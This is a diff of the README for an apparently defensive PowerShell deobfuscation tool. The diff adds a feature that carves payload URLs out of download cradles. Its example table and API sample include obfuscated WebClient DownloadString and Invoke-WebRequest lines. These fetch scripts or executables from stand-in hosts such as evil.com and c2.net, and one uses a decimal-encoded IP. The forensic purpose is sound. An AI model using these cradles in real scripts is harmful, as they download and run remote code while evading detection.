@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/maya-thorne/powershell-ast-deobfuscator"><img src="https://img.shields.io/badge/Release-v0.10.0-blue.svg?style=flat-square" alt="Release v0.10.0" /></a>
+  <a href="https://github.com/maya-thorne/powershell-ast-deobfuscator"><img src="https://img.shields.io/badge/Release-v0.11.0-blue.svg?style=flat-square" alt="Release v0.11.0" /></a>
   <a href="LICENSE"><img src="https://img.shields.io/badge/License-MT--SRL-emerald.svg?style=flat-square" alt="License MT-SRL" /></a>
   <a href="ROADMAP.md"><img src="https://img.shields.io/badge/Roadmap-Active-purple.svg?style=flat-square" alt="Roadmap Active" /></a>
   <a href="SECURITY.md"><img src="https://img.shields.io/badge/Security-Policy-red.svg?style=flat-square" alt="Security Policy" /></a>
@@ -55,7 +55,8 @@ The deobfuscation engine executes a multi-pass fixed-point reduction loop:
 11. **SecureString Decryption &amp; AST Reduction (`src/secure_string_reducer.py`)**: Statically resolves AES encryption keys, decrypts PowerShell `76492d11...` envelopes, unwraps Marshal BSTR and credential password access, and scrubs sensitive memory buffers.
 12. **AST Normalization &amp; Constant Folding (`src/normalizer.py`)**: Inlines string formats (`-f`), collapses string concatenations, strips parentheses artifacts, reduces call operators, and serializes clean syntax.
 13. **Fixed-Point Convergence (`src/deobfuscator_engine.py`)**: Iterates reduction passes until the code reaches a stable, non-mutating fixed point.
-14. **Automated Benchmark Harness &amp; Telemetry (`src/benchmark.py`)**: Runs evaluation over a 30-sample corpus across 10 categories, calculating Shannon entropy, artifact removal, ground-truth indicator recall, and composite fidelity score.
+14. **DownloadString &amp; WebClient API URL Carving (`src/webclient_tracer.py`)**: Statically traces and extracts remote payload download cradles, decodes obfuscated DWORD/hex/octal IPs, binds headers and proxies, and outputs normalized URLs.
+15. **Automated Benchmark Harness &amp; Telemetry (`src/benchmark.py`)**: Runs evaluation over a 30-sample corpus across 10 categories, calculating Shannon entropy, artifact removal, ground-truth indicator recall, and composite fidelity score.
 
 
 ---
@@ -97,6 +98,9 @@ The deobfuscation engine executes a multi-pass fixed-point reduction loop:
 | **Casing Randomization Normalization** | `iNvOkE-eXpReSsIoN` | `Invoke-Expression` |
 | **Type Casing Restoration** | `[sYsTeM.nEt.wEbClIeNt]` | `[System.Net.WebClient]` |
 | **Expandable String Inlining** | `"prefix $( 'cmd' ) suffix"` | `"prefix cmd suffix"` |
+| **WebClient URL Carving** | `(New-Object Net.WebClient).('Down'+'loadString')('h'+'ttp://evil.com/x.ps1')` | Normalized URL `http://evil.com/x.ps1`, method `DownloadString`, cradle `iex_download_string` |
+| **Obfuscated IP Auto-Decoding** | `(New-Object Net.WebClient).DownloadString('http://2130706433:8080/p.ps1')` | Host decoded to `127.0.0.1`, canonical URL `http://127.0.0.1:8080/p.ps1` |
+| **Download Cmdlet Resolution** | `Invoke-WebRequest -Uri 'http://c2.net/x.exe' -OutFile '$env:temp\x.exe'` | Carved target with destination `x.exe`, api `Cmdlet`, cradle `cmdlet_download` |
 | **Automated Benchmark Harness** | `pwsh-ast --benchmark` | 30-sample corpus evaluation, recall, entropy, and fidelity telemetry |
 
 ---
@@ -129,9 +133,10 @@ The deobfuscation engine executes a multi-pass fixed-point reduction loop:
 | `src/benchmark_metrics.py` | Shannon entropy, artifact detection, ground-truth recall, AST validity &amp; fidelity scoring |
 | `src/benchmark_runner.py` | Automated batch test runner, execution timer, and Text/JSON/Markdown report generator |
 | `src/benchmark.py` | Unified public facade for the automated benchmark suite |
+| `src/webclient_tracer.py` | WebClient, HttpClient, download cmdlet static tracer &amp; remote payload URL carving engine |
 | `src/deobfuscator_engine.py` | Multi-pass fixed-point convergence engine |
-| `src/cli.py` | Command-line interface with AST visualization, benchmark runner, export &amp; forensic telemetry |
-| `tests/` | Comprehensive test suite (237 unit tests) covering lexer, parser, normalizer, crypto, and benchmark harness |
+| `src/cli.py` | Command-line interface with AST visualization, benchmark runner, URL carver &amp; forensic telemetry |
+| `tests/` | Comprehensive test suite (259 unit tests) covering lexer, parser, normalizer, crypto, URL carving &amp; benchmarks |
 | `ROADMAP.md` | Public development milestones and engineering roadmap |
 | `SECURITY.md` | Vulnerability disclosure policy and reporting process |
 
@@ -146,10 +151,10 @@ Run the full automated test suite:
 python -m unittest discover tests -v
 ```
 
-All 237 unit tests execute with zero failures:
+All 259 unit tests execute with zero failures:
 
 ```text
-Ran 237 tests in 0.153s
+Ran 259 tests in 0.095s
 
 OK
 ```
@@ -224,6 +229,18 @@ python -m src.cli "Get-Process | Out-String" --json -o ast_dump.json
 python -m src.cli "Get-Process | Out-String" --stats
 ```
 
+#### Remote Payload URL Carving &amp; Cradle Tracing
+
+Statically carve remote payload download URLs, decode obfuscated IPs, and extract cradle telemetry:
+
+```bash
+# Print unique canonical payload URLs (one per line)
+python -m src.cli sample.ps1 --urls
+
+# Dump complete forensic telemetry with method, headers, proxy, and cradle type (JSON)
+python -m src.cli sample.ps1 --carve-urls -o carved_targets.json
+```
+
 ### Python API
 
 ```python
@@ -231,6 +248,7 @@ from src.deobfuscator_engine import PowerShellDeobfuscator
 from src.ast_visualizer import render_ast_tree
 from src.ast_exporter import export_ast_mermaid, export_ast_json, extract_ast_metrics
 from src.benchmark import run_benchmark, to_text_report, to_markdown_report
+from src.webclient_tracer import trace_webclient, extract_download_urls
 
 # 1. Multi-pass deobfuscation
 engine = PowerShellDeobfuscator()
@@ -244,15 +262,21 @@ summary = run_benchmark()
 print(f"Fidelity Score: {summary.average_fidelity_score}%, Recall: {summary.average_indicator_recall * 100.0}%")
 print(to_text_report(summary))
 
-# 3. AST Visualization
+# 3. Remote Payload URL Carving & WebClient Tracing
+targets = trace_webclient("(New-Object Net.WebClient).DownloadString('http://2130706433:8080/beacon.ps1')")
+for t in targets:
+    print(f"URL: {t.url}, Host: {t.host}, IP Decoded: {t.ip_decoded}, Cradle: {t.cradle_type}")
+# Output: URL: http://127.0.0.1:8080/beacon.ps1, Host: 127.0.0.1, IP Decoded: 2130706433 -> 127.0.0.1, Cradle: iex_download_string
+
+# 4. AST Visualization
 tree = render_ast_tree("$x = 'test' + 'ing'")
 print(tree)
 
-# 4. Export to Mermaid diagram
+# 5. Export to Mermaid diagram
 mermaid_diagram = export_ast_mermaid("if ($true) { Get-Process }")
 print(mermaid_diagram)
 
-# 5. Extract structural metrics
+# 6. Extract structural metrics
 metrics = extract_ast_metrics("Get-Process | Out-String")
 print(f"Total nodes: {metrics['total_nodes']}, Cyclomatic complexity: {metrics['cyclomatic_complexity']}")
 ```
